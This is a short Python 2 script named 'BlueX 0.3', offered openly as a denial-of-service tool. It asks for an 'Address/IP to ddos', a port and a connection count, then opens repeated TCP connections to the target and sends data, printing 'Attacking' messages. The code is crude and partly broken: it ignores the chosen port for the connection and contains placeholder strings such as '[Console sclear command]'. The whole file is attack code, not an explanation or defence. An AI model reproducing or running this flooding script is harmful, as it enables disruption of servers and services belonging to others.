import time
import socket
import os
import sys
import string

def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)
curdir = os.getcwd()
os.system('[Console sclear command]')
print ("BlueX 0.3 (for [OS])")
print ("")
host=raw_input("Address/IP to ddos: ")
port=input( "Port (80): " )
conn=input("Connections: ")
message=raw_input("Press enter to continue.")
ip = socket.gethostbyname( host )
print ("-----------------------------------------------------")
print ("")
def dos():
    #pid = os.fork()
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send( message )
        ddos.sendto( message, (ip, port) )
        ddos.send( message );
    except socket.error, msg:
        print("--> Error!")
    print ( "--> Attacking "+host +", with IP: "+ ip +"")
    ddos.close()
for i in range(1, conn):
    dos()
print ("-------------------------------------------------------")
print ("BlueX_attack: "+host +" with IP: "+ ip +" --> FINISHED!")
if __name__ == "__main__":
    answer = raw_input("Continue? (Y/N)")
    if answer.strip() in "Y y".split():
        restart_program()
